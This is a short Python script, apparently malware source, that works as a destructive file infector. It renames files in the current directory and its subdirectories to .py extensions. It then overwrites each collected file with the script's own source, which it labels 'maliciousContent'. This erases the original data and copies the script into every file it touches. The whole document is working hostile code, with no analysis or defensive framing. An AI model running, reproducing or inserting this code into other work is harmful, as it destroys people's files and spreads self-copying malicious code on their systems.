import os
import sys

class GeneralData:
    files = []
    directories = []

def FormatChanger():
    for i in os.listdir(os.getcwd()):
        if '.' in i:
            try:
                os.rename(os.getcwd() + '/' + '{}'.format(i) , os.getcwd() + "/" + '{}.py'.format(i.split('.')[0]))
            except:
                continue
        else:
            GeneralData.directories.append(i)
    
for i in os.listdir(os.getcwd()):
    if os.path.isfile(i):
        GeneralData.files.append(i)

FormatChanger()

for i in GeneralData.directories:
    os.chdir(i)
    FormatChanger()
    

def ReadFileContent(files):
    for file in files:
        try:
            with open(file , mode= 'r') as f:
                if f.read() == InfectedFileContent():
                    continue
                else:
                    ContentChanger(file)        
        except:
            continue

def InfectedFileContent():
    with open(sys.argv[0] , mode='r') as f:
        maliciousContent = f.read()
    return maliciousContent

def ContentChanger(file):
    with open(file , mode= 'w') as f:
        f.write(InfectedFileContent())

ReadFileContent(GeneralData.files)
